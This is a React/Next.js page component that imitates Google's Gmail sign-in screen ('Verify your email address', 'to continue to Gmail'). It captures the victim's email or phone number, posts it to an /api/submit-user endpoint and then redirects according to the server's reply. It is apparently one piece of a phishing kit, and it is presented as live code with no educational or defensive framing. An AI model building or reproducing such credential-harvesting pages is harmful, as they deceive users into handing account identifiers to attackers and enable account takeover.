'use client';

import { useSearchParams } from 'next/navigation';
import SearchParamsWrapper from '../../components/SearchParamsWrapper';
import '../../public/styles/userentry.css'; // ✅ Import CSS at top-level in client component


function UserEntryPageContent() {
  const searchParams = useSearchParams();
  // Get the first query parameter value (regardless of key name)
  const data3 = Array.from(searchParams.values())[0];

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const username = formData.get('username') as string;

    const response = await fetch('/api/submit-user', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username }),
    });

    if (response.ok) {
      const result = await response.json();
      window.location.href = result.redirectUrl;
    }
  };

  return (
    <>
      <div className="maindiv">
        <div className="form-half">
          <div>
            <img className="divlogo" src="./images/image.png" alt="Logo" />
          </div>
          <div>
            <span className="welcome">Verify your email address</span>
          </div>
          <br />
          <div>
            <span className="welcomee">to continue to Gmail</span>
          </div>
        </div>

        <form className="loginform" onSubmit={handleSubmit}>
          <div className="form-half1">
            <div className="passdiv">
              <input
                required
                name="username"
                type="text"
                id="pEyar"
                placeholder=""
                onFocus={(e) => e.target.classList.add('focused')}
                onBlur={(e) => {
                  if (e.target.value.trim() !== '') {
                    e.target.classList.add('focused');
                  } else {
                    e.target.classList.remove('focused');
                  }
                }}
              />
              <label htmlFor="pEyar" className="placeholder-label">
                Email or Phone
              </label>
            </div>

            <div id="togglePassword" className="shwpwd">
              <span className="button">
                <b>Forgot email?</b>
              </span>
            </div>

            <div className="guest-mode">
              <span>
                Not your computer? Use a Private Window to sign in.{' '}
                <a href="https://support.google.com/accou/answer/1627467" target="_blank">
                  <b>
                    Learn more about <br /> using Guest mode
                  </b>
                </a>
              </span>
            </div>

            <div className="fgtpwd">
              <button type="button" className="hyperl">
                <b>Create account</b>
              </button>
              &nbsp;&nbsp;&nbsp;
              <button type="submit" className="btnnxt">
                Next
              </button>
            </div>
          </div>
        </form>
      </div>

      <div className="btmdiv">
        <div className="left-div">
          <select className="btmhypl" id="language-select">
            <option value="en">English (United States)</option>
            <option value="fr">French</option>
            <option value="es">Spanish</option>
            <option value="de">German</option>
          </select>
        </div>

        <div className="right-divs">
          <div className="right-div">
            <button className="btmhypl">Help</button>
          </div>
          <div className="right-div">
            <button className="btmhypl">Privacy</button>
          </div>
          <div className="right-div">
            <button className="btmhypl">Terms</button>
          </div>
        </div>
      </div>
    </>
  );
}

export default function UserEntryPage() {
  return (
    <SearchParamsWrapper>
      <UserEntryPageContent />
    </SearchParamsWrapper>
  );
}
